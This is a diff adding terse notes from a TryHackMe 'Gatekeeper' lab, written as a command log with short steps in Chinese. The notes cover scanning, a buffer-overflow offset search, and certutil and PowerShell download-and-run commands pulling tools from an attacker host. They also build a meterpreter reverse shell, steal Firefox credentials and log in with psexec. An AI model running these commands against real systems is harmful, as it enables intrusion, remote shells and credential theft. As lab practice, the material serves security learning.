@@ -1,0 +1,62 @@
+nmap -sC -sV -Pn 10.10.215.176 > nmap.txt
+nmap -p- 10.10.215.176 > nmapall.txt
+
+
+ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300
+!mona findmsp -distance 300
+
+ Message=    EIP contains normal pattern : 0x39654138 (offset 146)
+
+
+!mona config -set workingfolder C:\mona\%p
+!mona bytearray -b "\x00"
+!mona compare -f C:\mona\gatekeeper\bytearray.bin -a <address>
+
+
+Log data, item 4
+ Address=080414C3
+ Message=  0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\admin\Desktop\gatekeeper.exe)
+
+
+certutil.exe -urlcache -split -f http://10.9.0.204/winPEAS.exe winPEAS.exe
+certutil.exe -urlcache -split -f http://10.9.0.204/nc64.exe nc64.exe
+certutil.exe -urlcache -split -f http://10.9.0.204/MSFRottenPotato.exe MSFRottenPotato.exe
+certutil.exe -urlcache -split -f http://10.9.0.204/shell.bat shell.bat
+certutil.exe -urlcache -split -f http://10.9.0.204/Chimichurri.exe Chimichurri.exe
+certutil.exe -urlcache -split -f http://10.9.0.204/Seatbelt.exe Seatbelt.exe
+certutil.exe -urlcache -split -f http://10.9.0.204/SeatbeltNet3.5x64.exe SeatbeltNet3.5x64.exe
+certutil.exe -urlcache -split -f http://10.9.0.204/SharpWeb.exe SharpWeb.exe
+C:\Users\natbat\Desktop\MSFRottenPotato.exe * C:\Users\natbat\Desktop\shell.bat
+Chimichurri.exe 10.9.0.204 5555
+
+powershell IEX(New-Object Net.Webclient).downloadstring('http://10.9.0.204/Sherlock.ps1')
+
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.0.204 LPORT=4444 -f exe -o reverse.exe
+
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST tun0reter/reverse_tcp
+
+1.nmap掃描後發現有33137
+2.samba找到gatekeeper 使用BOF取得reverse shell
+3.必須使用meterpreter將 process從32bit migrate到64bit(taskhost)
+4.下載SeatbeltNet3 64bit
+5.執行SeatbeltNet3 發現有 Firefox credential file exists at C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\key4.db
+SeatbeltNet3.5x64.exe all
+6.meterpreer search firefox_creds
+post/multi/gather/firefox_creds
+7.將firefox creds下載到本地
+[+] Downloaded cert9.db: /home/kali/.msf4/loot/20210515111454_default_10.10.101.105_ff.ljfn812a.cert_679943.bin
+[+] Downloaded cookies.sqlite: /home/kali/.msf4/loot/20210515111457_default_10.10.101.105_ff.ljfn812a.cook_506101.bin
+[+] Downloaded key4.db: /home/kali/.msf4/loot/20210515111504_default_10.10.101.105_ff.ljfn812a.key4_187838.bin
+[+] Downloaded logins.json: /home/kali/.msf4/loot/20210515111510_default_10.10.101.105_ff.ljfn812a.logi_064903.bin
+8.將對應檔案改名
+9.使用firefox_decrypt解密
+python3 firefox_decrypt.py /home/kali/timmy/TryHackMe/Gatekeeper/firefox_cres/
+10.使用psexec登入
+python3 ./psexec.py  mayor:'8CL7O1N78MdrCIsV'@10.10.101.105
+
+Website:   https://creds.com
+Username: 'mayor'
+Password: '8CL7O1N78MdrCIsV'
